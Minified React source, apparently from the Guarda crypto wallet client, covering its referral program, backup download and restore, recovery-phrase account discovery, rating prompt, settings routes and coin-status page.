                onClick: () => 1 !== a.length ? goToReceive(i) : null
            })))
        }
        const SJ = a.p + "0f0cbe2593ace1e5566803268bd0c51f.svg"
          , CJ = a.p + "200f521bdf645dee72c885c51280c5e8.svg";
        function ReferralProgram() {
            const [e,t] = (0,
            O.useState)(null)
              , [a,n] = (0,
            O.useState)()
              , [r,l] = (0,
            O.useState)(null)
              , [s,i] = (0,
            O.useState)(null)
              , [o,c] = (0,
            O.useState)()
              , [u,d] = (0,
            O.useState)(!1)
              , m = (0,
            $.I0)()
              , p = (0,
            $.v9)($c)
              , f = usePopup()
              , E = (0,
            $.v9)(Ot)
              , [h,g] = (0,
            O.useState)(!1)
              , [y,v] = (0,
            O.useState)(!1)
              , _ = p.filter((e => !e.watchOnly && "eth" === e.currency && !e.hw))
              , [w,b] = (0,
            O.useState)(!!_.length);
            (0,
            O.useEffect)(( () => {
                cc.$.send(cc.d.REFERRAL_OPEN_PAGE)
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                let e = !1;
                (async () => {
                    if (_.length) {
                        const t = await m(getReferrerLinks(_));
                        if (e)
                            return;
                        if (t.length) {
                            i(t);
                            const e = _.filter((e => t.find((t => t.address.toLowerCase() === e.address.toLowerCase()))));
                            l(e)
                        }
                        b(!1)
                    }
                }
                )();
                return () => {
                    e = !0
                }
            }
            ), [e]);
            (0,
            O.useEffect)(( () => {
                _.length && !r && n(_[0])
            }
            ), [_.length]);
            async function setProcess(e) {
                c(e);
                return new Promise((e => setTimeout(e, 1e3)))
            }
            async function handleGetLink(e) {
                if (!h) {
                    v(!0);
                    return
                }
                const n = a || e;
                if (n) {
                    d(!0);
                    await setProcess("Receiving link...");
                    try {
                        const e = await get_params_with_sig(n)
                          , a = await m(getSecureData(tt))
                          , r = await m(createReferrerLink({
                            ...e,
                            backupId: a
                        }));
                        cc.$.send(cc.d.REFERRAL_GET_REF_LINK);
                        t(r)
                    } catch (e) {
                        await setProcess("Something went wrong. Contact support.");
                        console.error("error get referral link", e);
                        cc.$.send(cc.d.REFERRAL_GET_REF_LINK_ERROR);
                        d(!1);
                        await setProcess(void 0)
                    }
                }
            }
            const {createWallet: k} = useCreateWallet({
                callback: e => {
                    f.onAfterCreateWallet({
                        walletModel: e,
                        backupDownloaded: !0,
                        persistorFlushFailedFatally: !1
                    });
                    n(e);
                    handleGetLink(e)
                }
            });
            async function handleCreateWalletAndGetLink() {
                if (h) {
                    d(!0);
                    await setProcess("Creating Eth wallet...");
                    k({
                        currency: "eth",
                        isCoin: !0
                    })
                } else
                    v(!0)
            }
            const handleChangeWallet = e => {
                n(e)
            }
            ;
            function handleOnChangeCheckBox() {
                g(!h);
                v(!1)
            }
            return O.createElement("div", {
                className: Ht()(bQ, {
                    [kQ]: w
                })
            }, O.createElement("div", {
                className: CQ
            }, O.createElement("h4", null, "Invite friends and earn rewards"), w && O.createElement("img", {
                src: "dark" === E ? CJ : SJ,
                alt: "loader"
            }), !w && r && O.createElement(RefLinksList, {
                wallets: r,
                refLinks: null != s ? s : []
            }), !w && !r && O.createElement("div", {
                className: sJ
            }, O.createElement("div", {
                className: lJ
            }, "rules"), O.createElement("ul", {
                className: LQ
            }, O.createElement("li", null, "Share the link with your friends"), O.createElement("li", null, "Friends make an exchange"), O.createElement("li", null, "Get 0.5% of their exchange amount in Guarda tokens")), O.createElement("div", {
                className: FQ
            }, O.createElement("a", {
                href: "https://support.guarda.com/referral/referral-program-rules",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "Read full Program Rules"), O.createElement("a", {
                href: "https://support.guarda.com/referral/referral-program-rules",
                target: "_blank",
                rel: "noreferrer noopener"
            }, O.createElement("img", {
                className: zQ,
                src: $W,
                alt: "link icon"
            }))), !_.length && O.createElement(O.Fragment, null, O.createElement("div", {
                className: lJ
            }, "consent"), O.createElement("div", {
                className: fJ
            }, O.createElement(mp, {
                checked: h,
                onChange: handleOnChangeCheckBox,
                isInvalid: !h && y
            }), O.createElement("span", {
                className: AQ
            }, "I agree with the ", O.createElement("a", {
                href: "https://support.guarda.com/referral/referral-program-rules",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "Program Rules"), O.createElement("a", {
                href: "https://support.guarda.com/referral/referral-program-rules",
                target: "_blank",
                rel: "noreferrer noopener"
            }, O.createElement("img", {
                className: zQ,
                src: $W,
                alt: "link icon"
            }))))), _.length ? O.createElement(O.Fragment, null, O.createElement("div", {
                className: lJ
            }, "Wallet for rewards"), O.createElement("div", {
                className: tJ
            }, O.createElement("div", {
                className: Ht()(jQ, 1 !== _.length && ZQ)
            }, O.createElement(Mh, {
                disabled: u || 1 === _.length,
                newArrow: !0,
                isNoBorder: !0,
                isNewStyles: !0,
                noDisabledStyle: !0,
                withAddress: !0,
                withArrowWhenDisabled: 1 !== _.length,
                withoutSubwallets: !0,
                wallets: _,
                selectedWallet: a,
                onChange: handleChangeWallet,
                customFilter: e => onCustomFilterWallets(e, ["eth"]),
                emptyPlaceholder: "You can select only ETH here"
            })), O.createElement("div", {
                className: lJ
            }, "consent"), O.createElement("div", {
                className: fJ
            }, O.createElement(mp, {
                checked: h,
                onChange: handleOnChangeCheckBox,
                isInvalid: !h && y
            }), O.createElement("span", {
                className: AQ
            }, "I agree with the ", O.createElement("a", {
                href: "https://support.guarda.com/referral/referral-program-rules",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "Program Rules"), O.createElement("a", {
                href: "https://support.guarda.com/referral/referral-program-rules",
                target: "_blank",
                rel: "noreferrer noopener"
            }, O.createElement("img", {
                className: zQ,
                src: $W,
                alt: "link icon"
            })))), O.createElement("div", null, O.createElement(Yl, {
                onClick: () => handleGetLink(a),
                className: HQ,
                color: "blue",
                size: "big",
                disabled: u
            }, "Participate and get link")))) : O.createElement("div", {
                className: tJ
            }, O.createElement(Yl, {
                onClick: handleCreateWalletAndGetLink,
                className: HQ,
                color: "blue",
                size: "big"
            }, "Create ETH wallet and get link"))), O.createElement("br", null), u && !e && O.createElement("div", {
                className: BQ
            }, o && O.createElement("span", null, o))))
        }
        const NJ = "download-backup_wrapper_1aoSw app_wrapperBlock_2EpA3"
          , TJ = "download-backup_wrapperForm_24vJn app_wrapperCenterBlockBackup_1twFL"
          , AJ = "download-backup_buttonShow_1nliZ"
          , xJ = "download-backup_buttonDownload_1vUAe"
          , IJ = "download-backup_textarea_1lhOS textarea_textarea_3EjI7"
          , PJ = "download-backup_acceptedBackup_2N3Kc styles_dashedNormal_xEvl8"
          , LJ = "download-backup_goodBoy_1ShTS"
          , FJ = "download-backup_backupInformationBorder_2Xm8U"
          , WJ = "download-backup_backupInformationWrapper_1t-GJ textarea_textarea_3EjI7"
          , RJ = "download-backup_backupWrapperContent_MKsJT"
          , BJ = "download-backup_showBackupLink_lut_m"
          , OJ = "download-backup_buildTime_ji9oo"
          , DJ = "download-backup_message_1p1py"
          , MJ = "download-backup_messageWrapper_24Pmw"
          , UJ = "download-backup_warningIcon_LHXI6"
          , GJ = "download-backup_iconProtectOk_1pWX_"
          , VJ = "download-backup_iconProtectWarning_2ZozS"
          , DownloadBackupPage = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(oe.gX)
              , a = (0,
            $.v9)(selectedBackupNotify)
              , n = (0,
            $.v9)($c)
              , r = (0,
            $.v9)(xm)
              , [l,s] = (0,
            O.useState)(r)
              , [i,o] = (0,
            O.useState)(void 0);
            (0,
            O.useEffect)(( () => {
                async function fetchUpdateDateStorage() {
                    const t = await e(getSecureData(Xe));
                    o(t)
                }
                fetchUpdateDateStorage()
            }
            ), [e, n]);
            (0,
            O.useEffect)(( () => {
                e(setFilenameBackupToStore(l))
            }
            ), [l, e]);
            const handleDownloadBackup = () => {
                e(handleDownload(Sm.FORCE));
                e(removeNotifyBackup())
            }
              , handleRemoveNotify = () => {
                e(removeNotifyBackup())
            }
            ;
            return O.createElement("div", {
                className: NJ
            }, O.createElement("div", {
                className: TJ
            }, O.createElement("h3", null, "Guarda Wallet Backup"), O.createElement("p", null, "The backup contains all your private keys that give you access to your money.", O.createElement("br", null), "⚠️⚠️⚠️ ", O.createElement("b", null, " Guarda cannot restore your backup."), "️ Keep it safe and secure."), O.createElement("div", null, O.createElement(button_copy, {
                className: PJ,
                text: t,
                onClick: handleRemoveNotify
            }, (e => e ? O.createElement(Yl, {
                className: AJ,
                color: "light-blue"
            }, "Copied") : O.createElement(Yl, {
                className: AJ,
                color: "light-blue"
            }, "Copy backup text"))), O.createElement(Yl, {
                color: "blue",
                className: xJ,
                onClick: handleDownloadBackup
            }, "Download backup file")), O.createElement("div", {
                className: FJ
            }, O.createElement("div", {
                className: WJ
            }, O.createElement("div", null, a ? O.createElement("div", {
                className: VJ
            }) : O.createElement("div", {
                className: GJ
            })), O.createElement("div", {
                className: RJ
            }, O.createElement("p", null, O.createElement("span", null, "Last Update:"), " ", i && date_format(i), O.createElement("br", null), O.createElement("span", null, "Wallets:"), " ", n.length, O.createElement("br", null), O.createElement("span", null, "Backup size:"), " ", format_bytes(t.length))), a && O.createElement("div", {
                className: MJ
            }, O.createElement(ui_message, {
                className: DJ,
                type: "error"
            }, "Backup has been updated! Save new version"), O.createElement("div", {
                className: UJ
            })))), M.CM && O.createElement(O.Fragment, null, O.createElement("br", null), O.createElement(label, null, "Backup download filename: (Only dev or staging feature)"), O.createElement(Ea, {
                value: l,
                onChange: e => {
                    let {target: {value: t}} = e;
                    return s(t)
                }
                ,
                placeholder: "guarda-backup-:dd-:mm-:yy-:hh-:MM.txt"
            })), O.createElement("br", null), O.createElement("br", null), O.createElement("span", {
                className: OJ
            }, "Release: ", date_format(1742999258908, "dd.mm.yyyy - hh:MM"))))
        }
          , KJ = DownloadBackupPage
          , HJ = "menu_menu_5tCIC menu_menu_2wA28"
          , zJ = "menu_active_3wpK9 menu_active_3L5Jb"
          , jJ = Boolean(M.CM && "1" === (0,
        bu.ZP)("feature-mnemonic"))
          , MenuRestore = () => O.createElement(O.Fragment, null, jJ && O.createElement("nav", {
            className: HJ
        }, O.createElement(Y.OL, {
            exact: !0,
            to: (0,
            M.RU)("/settings/restore-backup"),
            activeClassName: zJ
        }, "Restore from Guarda Backup"), O.createElement(Y.OL, {
            exact: !0,
            to: (0,
            M.RU)("/settings/restore-mnemonic"),
            activeClassName: zJ
        }, "Recovery Phrase")))
          , $J = {
            wrapper: "restore-backup_wrapper_Tykgn app_wrapperBlock_2EpA3",
            wrapperForm: "restore-backup_wrapperForm_14k6U app_wrapperCenterBlockBackup_1twFL",
            recoveryDescription: "restore-backup_recoveryDescription_13bLs",
            dragAndDrop: "restore-backup_dragAndDrop_1bhqb",
            inputWrapper: "restore-backup_inputWrapper_3RrAB",
            inputText: "restore-backup_inputText_crVf-",
            textFieldWrapper: "restore-backup_textFieldWrapper_30s_l",
            textareaFieldset: "restore-backup_textareaFieldset_26KU6",
            textarea: "restore-backup_textarea_BtE5D",
            hideMnemonic: "restore-backup_hideMnemonic_218gr",
            pasteButton: "restore-backup_pasteButton_7HBdc",
            inputFieldset: "restore-backup_inputFieldset_2-EvQ",
            isMobile: "restore-backup_isMobile_cVC_a",
            showPassIconBlue: "restore-backup_showPassIconBlue_2p6-b",
            hidePassIconBlue: "restore-backup_hidePassIconBlue_YGuPy",
            icon: "restore-backup_icon_1MlsR",
            rightIcon: "restore-backup_rightIcon_18_OH",
            leftIcon: "restore-backup_leftIcon_3bO1p",
            wrapperQrScanner: "restore-backup_wrapperQrScanner_4xCgZ",
            wrapperAddButton: "restore-backup_wrapperAddButton_2Ai7W",
            mobileButton: "restore-backup_mobileButton_2utMd"
        }
          , ZJ = undefined
          , restore_backup = () => O.createElement("div", {
            className: $J.wrapper
        }, O.createElement("div", {
            className: $J.wrapperForm
        }, O.createElement(MenuRestore, null), O.createElement(RestoreTab, {
            type: "merge",
            title: "Restore with Guarda backup",
            description: "Upload Guarda backup file or text to restore your wallets. <br/> They will be merged to your current backup."
        })));
        var YJ = a(51231)
          , qJ = a.n(YJ);
        function shuffle(e) {
            return e.slice().sort(( () => Math.sign(Math.random() - .5)))
        }
        function delay() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 300;
            return new Promise((t => setTimeout(t, e + (Math.random() - .5) / 3 * e)))
        }
        const XJ = Se.Z.getTickersByCoinAdapterFeatures((e => e.isActiveBulkCreate)).filter((e => e in Wf.coins))
          , QJ = {
            async getAddressFromPrivateKey(e) {
                let {ticker: t, privateKey: a} = e;
                const n = await Se.Z.loadFullAdapter({
                    ticker: t
                });
                await delay();
                try {
                    const {address: e} = await n.getAddressFromPrivateKey({
                        privateKey: a
                    });
                    await delay();
                    return {
                        address: e
                    }
                } catch (e) {
                    z()(e instanceof Error, "Unexpected error type");
                    if ("AdapterError" === e.name && (e.errorCode === _f().HBAR_ACCOUNT_NOT_FOUND || e.errorCode === _f().HBAR_ACCOUNT_EXPIRED)) {
                        await delay();
                        return {
                            address: void 0
                        }
                    }
                    throw e
                }
            },
            async addressHasTransations(e) {
                let {ticker: t, address: a, privateKey: n} = e, r;
                if (t in qJ().coins) {
                    const e = undefined
                      , n = new (0,
                    qJ().coins[t])(void 0);
                    r = await n.getTransactionsByAddress({
                        address: a,
                        currency: t
                    })
                } else {
                    const e = await Se.Z.loadFullAdapter({
                        ticker: t
                    });
                    await delay();
                    r = await e.getTransactionsByAddress({
                        address: a,
                        privateKey: n
                    })
                }
                const l = (0,
                Ae.k)(r);
                await delay();
                return l.length > 0
            }
        };
        function DiscoverAccounts(e) {
            let {mnemonic: t, onDoneAccountDiscovery: a} = e;
            const [n,r] = (0,
            O.useState)([])
              , [l,s] = (0,
            O.useState)([])
              , [i,o] = (0,
            O.useState)([]);
            (0,
            O.useEffect)(( () => {
                const e = new (Zo());
                (async () => {
                    r([]);
                    o([]);
                    const n = await Wf.discoverAccounts(t.trim(), {
                        concurrency: 3,
                        abortSignal: e.signal,
                        tickers: shuffle(XJ),
                        accountProbe: QJ,
                        eventHandlers: {
                            async onStartedTickerAccountDiscovery(e) {
                                await delay();
                                s((t => t.concat(e)))
                            },
                            async onAccountDiscovered(e) {
                                await delay();
                                r((t => t.concat(e)))
                            },
                            onDoneTickerAccountDiscovery(e) {
                                o((t => t.concat(e)));
                                s((t => t.filter((t => t !== e))))
                            },
                            onError(e, t) {
                                console.error("onError", e, t)
                            }
                        }
                    })
                      , l = await Promise.all(n.accounts.map((async e => {
                        let {ticker: a, accountIndex: n} = e;
                        const {privateKey: r} = await Wf.deriveForAdapter(t, {
                            ticker: a,
                            accountIndex: n
                        });
                        await delay(100);
                        const l = Se.Z.getMetadata({
                            ticker: a
                        })
                          , s = await Se.Z.getApiByCurrency(a);
                        await delay(100);
                        const {address: i} = await s.getAddressFromPrivateKey({
                            privateKey: r
                        });
                        await delay(100);
                        const o = undefined;
                        return {
                            uuid: (0,
                            he.Z)(),
                            currency: a,
                            address: i,
                            privateKey: r,
                            title: (null == l ? void 0 : l.title) || "",
                            balance: "0",
                            subWallets: [],
                            derivedFromMnemonicUsing: {
                                accountIndex: n
                            }
                        }
                    }
                    )));
                    a(l)
                }
                )();
                return () => e.abort()
            }
            ), []);
            return O.createElement(O.Fragment, null, O.createElement("p", null, "Discovering", " ", l.slice().sort().join(", ").toUpperCase(), " ", "wallets.", O.createElement("br", null), O.createElement("span", {
                style: {
                    visibility: n.length > 1 ? "initial" : "hidden"
                }
            }, "Found ", n.length, " wallets total.")), O.createElement(loader, {
                visible: !0,
                width: 20
            }), O.createElement(ProgressBar, {
                progress: i.length / XJ.length
            }))
        }
        const recovery_phrase_RecoveryPhrase = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            j.k6)()
              , [a,n] = (0,
            O.useState)("")
              , [r,l] = (0,
            O.useState)(!0)
              , [s,i] = (0,
            O.useState)(!1)
              , handleScanMnemonic = e => {
                n(e)
            }
            ;
            function handleDoneAccountDiscovery(a) {
                e(mergeWalletsIntoSecureStorage(a));
                t.push("/app")
            }
            return O.createElement("div", {
                className: $J.wrapper
            }, O.createElement("div", {
                className: $J.wrapperForm
            }, O.createElement(MenuRestore, null), s ? O.createElement(DiscoverAccounts, {
                mnemonic: a,
                onDoneAccountDiscovery: handleDoneAccountDiscovery
            }) : O.createElement(O.Fragment, null, O.createElement("p", {
                className: Ht()($J.p, $J.recoveryDescription, {
                    [$J.isMobile]: (0,
                    M.tq)() || (0,
                    M.p1)()
                })
            }, "Enter recovery phrase to restore your wallets.", O.createElement("br", null), "They will be added to current backup."), O.createElement("div", {
                className: $J.textFieldWrapper
            }, O.createElement("fieldset", {
                className: $J.textareaFieldset
            }, O.createElement(aE, {
                placeholder: "Enter your recovery phrase or mnemonic",
                spellCheck: "false",
                className: Ht()($J.textarea, {
                    [$J.hideMnemonic]: !r
                }),
                value: a,
                onChange: e => {
                    let {target: {value: t}} = e;
                    return n(t)
                }
                ,
                "data-test-name": "mnemonic-text"
            }), O.createElement(qr_scanner_paste_button, {
                setAddress: handleScanMnemonic,
                className: Ht()($J.rightIcon)
            }), O.createElement("span", {
                onClick: () => l((e => !e)),
                className: Ht()($J.icon, !r && $J.showPassIconBlue, r && $J.hidePassIconBlue, $J.leftIcon)
            }))), O.createElement("div", {
                className: Ht()($J.wrapperAddButton, {
                    [$J.isMobile]: (0,
                    M.tq)() || (0,
                    M.p1)()
                })
            }, O.createElement(Yl, {
                disabled: s,
                onClick: () => i(!0),
                color: "blue",
                size: "big",
                className: Ht()(((0,
                M.tq)() || (0,
                M.p1)()) && $J.mobileButton),
                "data-test-name": "restore"
            }, "Restore")))))
        }
          , JJ = recovery_phrase_RecoveryPhrase
          , e0 = {
            wrapper: "rate-us_wrapper_2jlPw app_wrapperBlock_2EpA3",
            wrapperForm: "rate-us_wrapperForm_1_Wci app_wrapperCenterBlock_bcslh",
            informationWrapper: "rate-us_informationWrapper_3W2zU",
            closeButton: "rate-us_closeButton_3atrp",
            star: "rate-us_star_zOKKL",
            link: "rate-us_link_34Avr",
            stars: "rate-us_stars_1xRHH",
            popup: "rate-us_popup_3A3BG",
            popupWrapper: "rate-us_popupWrapper_1_-mb",
            popupButton: "rate-us_popupButton_1tkTf",
            iconRateUs: "rate-us_iconRateUs_3-AG7"
        }
          , t0 = undefined
          , rate_us = () => {
            const [e,t] = (0,
            O.useState)(0)
              , [a,n] = (0,
            O.useState)(null)
              , [r,l] = (0,
            O.useState)(!1)
              , mouseEnter = e => {
                let {target: a} = e;
                const n = null == a ? void 0 : a.dataset.number;
                t(n)
            }
              , mouseLeave = () => {
                t(0)
            }
              , mouseClick = e => {
                let {target: a} = e;
                const r = null == a ? void 0 : a.dataset.number;
                n(r);
                t(r)
            }
              , buttonClickHandler = () => {
                a && cc.$.send(cc.d.TRUSTPILOT_RAITING, String(a));
                Number(a) <= 3 && l(!0)
            }
            ;
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: e0.wrapper
            }, O.createElement("div", {
                className: e0.wrapperForm
            }, O.createElement("h4", null, "Rate Us"), O.createElement("p", null, "You can make Guarda Wallet better.", O.createElement("br", null), "Please rate us on ", O.createElement("b", null, "Trustpilot.")), O.createElement("div", {
                className: e0.informationWrapper
            }, O.createElement("div", {
                className: e0.iconRateUs
            }), O.createElement(nY, {
                rating: 4.5,
                isRedStar: !0
            }), O.createElement("p", null, "Over ", O.createElement("b", null, "500"), " reviews"), O.createElement("div", {
                className: e0.stars
            }, Array(5).fill(void 0).map(( (t, n) => e > n ? O.createElement("img", {
                key: n + 1,
                "data-number": n + 1,
                className: e0.star,
                src: RM,
                alt: "",
                onMouseOver: a ? void 0 : mouseEnter,
                onMouseLeave: a ? void 0 : mouseLeave,
                onClick: mouseClick
            }) : O.createElement("img", {
                key: n + 1,
                "data-number": n + 1,
                className: e0.star,
                src: WM,
                alt: "",
                onMouseOver: a ? void 0 : mouseEnter,
                onMouseLeave: a ? void 0 : mouseLeave,
                onClick: mouseClick
            })))), (null != a ? a : -1) > 3 ? O.createElement("a", {
                className: e0.link,
                href: "https://www.trustpilot.com/evaluate/guarda.co?",
                target: "_blank",
                rel: "noopener noreferrer"
            }, O.createElement(Yl, {
                color: "blue",
                onClick: buttonClickHandler
            }, "Rate Us")) : O.createElement(Yl, {
                color: "blue",
                onClick: buttonClickHandler
            }, "Rate Us")))), O.createElement(aa, {
                visible: r,
                className: e0.popup,
                onClose: () => l(!1),
                withoutCloseIcon: !0
            }, O.createElement("div", {
                className: Ht()(e0.wrapper, e0.popupWrapper)
            }, O.createElement("div", {
                className: e0.wrapperForm
            }, O.createElement("div", {
                className: e0.closeButton,
                dangerouslySetInnerHTML: {
                    __html: SW()
                },
                onClick: () => l(!1)
            }), O.createElement("h4", null, "Thanks for your feedback!"), O.createElement("p", null, "Let us know what do we need to improve."), O.createElement("div", {
                className: e0.popupFooter
            }, O.createElement(Yl, {
                className: e0.popupButton,
                color: "light-blue",
                size: "big",
                onClick: () => l(!1)
            }, "No, thanks"), O.createElement("a", {
                href: "https://support.guarda.com?widget=open",
                target: "_blank",
                rel: "noreferrer noopener"
            }, O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: () => l(!1)
            }, "Contact support")))))))
        }
          , a0 = "decode_wrapper_2Qxj- app_wrapperBlock_2EpA3"
          , n0 = "decode_wrapperForm_kxGYP"
          , r0 = "decode_textarea_WsUW2 textarea_textarea_3EjI7"
          , decode = () => {
            const [e,t] = (0,
            O.useState)("")
              , a = (0,
            $.I0)();
            (0,
            O.useEffect)(( () => {
                a(restoreStorage()).then((e => {
                    t(JSON.stringify(e, null, 2))
                }
                ))
            }
            ), []);
            return O.createElement("div", {
                className: a0
            }, O.createElement("div", {
                className: n0
            }, O.createElement("h3", null, "Decode Backup Guarda file"), O.createElement("div", {
                className: r0
            }, e)))
        }
          , l0 = "settings_title_xbyqA"
          , s0 = "settings_left-column_2-gXp"
          , i0 = undefined
          , settings = () => {
            (0,
            O.useEffect)(( () => {
                const e = document.getElementById("root");
                if ((0,
                M.d)()) {
                    e && (e.style.overflow = "hidden");
                    return () => {
                        e && (e.style.overflow = "auto")
                    }
                }
            }
            ), []);
            const e = !1;
            return O.createElement("div", {
                className: "container"
            }, O.createElement("div", {
                className: "row"
            }, O.createElement("div", {
                className: "col-xs-4 electron-left-column"
            }, O.createElement(TX, {
                radius: !0
            }, O.createElement(body, null, O.createElement("h1", {
                className: l0
            }, "Settings"), O.createElement(menu_settings, null)))), O.createElement("div", {
                className: "col-xs-8 electron-right-column"
            }, O.createElement(j.rs, null, O.createElement(j.AW, {
                exact: !0,
                path: "/app/settings/backup",
                component: KJ
            }), null, " ", O.createElement(j.AW, {
                exact: !0,
                path: "/app/settings/restore-backup",
                component: restore_backup
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/settings/restore-mnemonic",
                component: JJ
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/settings/change-password",
                component: ChangePassword
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/settings/password-required",
                component: PasswordRequired
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/settings/session-timeout",
                component: SesstionTimeoutPage
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/settings/rate-us",
                component: rate_us
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/settings/decode",
                component: decode
            }), (0,
            M.d)() && O.createElement(j.AW, {
                exact: !0,
                path: "/app/settings/night-mode",
                component: NightModePage
            })))))
        }
          , o0 = "main_wrapper_2dsdo app_wrapperBlock_2EpA3"
          , c0 = "main_wrapperBlock_2mkBE"
          , u0 = "main_tipText_s2sDx"
          , d0 = "main_wrapperList_2IHxK"
          , m0 = "main_block_1vXD8"
          , p0 = "main_currencyIcon_1hcRd"
          , f0 = "main_legend_pQYPh"
          , E0 = "main_label_Kawyy"
          , h0 = "main_status_OWmBN"
          , g0 = "main_ticker_3ah9E"
          , y0 = "main_isWarning_1-8qu"
          , v0 = "main_isError_1a8m3"
          , _0 = "main_notifications_5A2QO"
          , w0 = "main_counter_2HhBl"
          , b0 = "main_fullyOperational_2uyx6";
        function StatusCoinPage() {
            const [e,t] = (0,
            O.useState)(null)
              , [a,n] = (0,
            O.useState)()
              , r = (0,
            $.I0)()
              , l = Se.Z.getTickersByCoinAdapterFeatures((e => e.isActiveCreate)).sort(( (e, t) => {
                var a, n, r, l;
                return (null !== (a = null === (n = (0,
                be.II)(e)) || void 0 === n ? void 0 : n.title) && void 0 !== a ? a : "") > (null !== (r = null === (l = (0,
                be.II)(t)) || void 0 === l ? void 0 : l.title) && void 0 !== r ? r : "") ? 1 : -1
            }
            ))
              , s = (0,
            $.v9)(xi)
              , i = (0,
            $.v9)(selectedNotifications);
            (0,
            O.useEffect)(( () => {
                let e = !1;
                const t = new AbortController;
                (async () => {
                    const a = (await getCurrencies({
                        side: "buy",
                        abortController: t
                    })).coinList;
                    e || n(a)
                }
                )();
                r(Fu.fetchExchangeCurrencies());
                return () => {
                    t.abort();
                    e = !0
                }
            }
            ), []);
            const handleOpenCurrency = a => () => {
                t(e !== a ? a : null)
            }
              , isBalance = e => {
                var t, a;
                return null !== (t = null === (a = Se.Z.getRootMetadata(e)) || void 0 === a ? void 0 : a.coin.features.isActiveBalance) && void 0 !== t && t
            }
              , isTxs = e => {
                var t, a;
                return null !== (t = null === (a = Se.Z.getRootMetadata(e)) || void 0 === a ? void 0 : a.coin.features.isActiveTransactions) && void 0 !== t && t
            }
              , isSend = e => {
                var t, a;
                return null !== (t = null === (a = Se.Z.getRootMetadata(e)) || void 0 === a ? void 0 : a.coin.features.isActiveSend) && void 0 !== t && t
            }
              , isBuy = e => {
                var t;
                return null !== (t = null == a ? void 0 : a.includes(e)) && void 0 !== t && t
            }
              , isExchange = e => !!s.find((t => t.ticker === e))
              , isImport = e => {
                var t, a;
                return null !== (t = null === (a = Se.Z.getRootMetadata(e)) || void 0 === a ? void 0 : a.coin.features.isActiveImport) && void 0 !== t && t
            }
              , getNotifiesByLvlAndCurrency = (e, t) => i.filter((a => a.locations.indexOf(sm) > -1 && a.currencies.indexOf(e) > -1 && a.lvl === t))
              , countNotifications = e => i.filter((t => t.locations.indexOf(sm) > -1 && t.currencies.indexOf(e) > -1))
              , isWarning = (e, t) => {
                const a = undefined;
                return getNotifiesByLvlAndCurrency(e, 1).filter((e => e.affectitis.indexOf(t) > -1)).length > 0
            }
              , isError = (e, t) => {
                const a = undefined;
                return getNotifiesByLvlAndCurrency(e, 2).filter((e => e.affectitis.indexOf(t) > -1)).length > 0
            }
            ;
            return O.createElement("div", {
                className: o0
            }, O.createElement("div", {
                className: c0
            }, O.createElement(label, null, "Guarda Current Status"), O.createElement("p", {
                className: u0
            }, "Live status updates of supported cryptocurrencies. For your convenience, you can check the full functionality of all Guarda Wallet assets here."), O.createElement("div", {
                className: d0
            }, O.createElement("div", {
                className: f0
            }, O.createElement("div", {
                className: Ht()(E0, g0)
            }), O.createElement("div", {
                className: E0
            }, "Import"), O.createElement("div", {
                className: E0
            }, "Create"), O.createElement("div", {
                className: E0
            }, "Balance"), O.createElement("div", {
                className: E0
            }, "Transactions"), O.createElement("div", {
                className: E0
            }, "Send"), O.createElement("div", {
                className: E0
            }, "Exchange"), O.createElement("div", {
                className: E0
            }, "Buy")), l.map((t => {
                var a;
                return O.createElement(O.Fragment, {
                    key: `block${t}`
                }, O.createElement("div", {
                    className: m0,
                    onClick: handleOpenCurrency(t)
                }, O.createElement("div", {
                    className: g0
                }, O.createElement(IconCurrency, {
                    currency: t,
                    className: p0
                }), O.createElement("span", null, null === (a = (0,
                be.II)(t)) || void 0 === a ? void 0 : a.title, countNotifications(t).length > 0 && O.createElement("span", {
                    className: w0
                }, countNotifications(t).length))), O.createElement("div", {
                    className: h0
                }, isImport(t) && O.createElement("span", {
                    className: Ht()({
                        [y0]: isWarning(t, "import"),
                        [v0]: isError(t, "import")
                    })
                })), O.createElement("div", {
                    className: h0
                }, O.createElement("span", {
                    className: Ht()({
                        [y0]: isWarning(t, "create"),
                        [v0]: isError(t, "create")
                    })
                })), O.createElement("div", {
                    className: h0
                }, isBalance(t) && O.createElement("span", {
                    className: Ht()({
                        [y0]: isWarning(t, "balance"),
                        [v0]: isError(t, "balance")
                    })
                })), O.createElement("div", {
                    className: h0
                }, isTxs(t) && O.createElement("span", {
                    className: Ht()({
                        [y0]: isWarning(t, "history"),
                        [v0]: isError(t, "history")
                    })
                })), O.createElement("div", {
                    className: h0
                }, isSend(t) && O.createElement("span", {
                    className: Ht()({
                        [y0]: isWarning(t, "send"),
                        [v0]: isError(t, "send")
                    })
                })), O.createElement("div", {
                    className: h0
                }, isExchange(t) && O.createElement("span", {
                    className: Ht()({
                        [y0]: isWarning(t, "exchange"),
                        [v0]: isError(t, "exchange")
                    })
                })), O.createElement("div", {
                    className: h0
                }, isBuy(t) && O.createElement("span", {
                    className: Ht()({
                        [y0]: isWarning(t, "buy"),
                        [v0]: isError(t, "buy")
                    })
                }))), e === t && O.createElement("div", {
                    className: _0
                }, countNotifications(t).length > 0 && O.createElement(_m, {
                    currency: t,
                    type: sm
                }), 0 === countNotifications(t).length && O.createElement("p", {
                    className: b0
                }, "Fully operational.")))
            }
            ))), O.createElement("p", {
                className: u0
            }, "If you have any questions, or need clarification, our support team is always available to answer any questions about your balances, exchanges or transactions.", " ", O.createElement("a", {
                href: "https://support.guarda.com?widget=open",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "Create a ticket"))))
        }
        function StatusCoinRoot() {
            return O.createElement("div", {
                className: "container"
            }, O.createElement("div", {
                className: "row"
            }, O.createElement("div", {
                className: "col-xs-12"
            }, O.createElement(j.rs, null, O.createElement(j.AW, {
                exact: !0,
                path: "/app/status-coins",
                component: StatusCoinPage
            })))))
        }
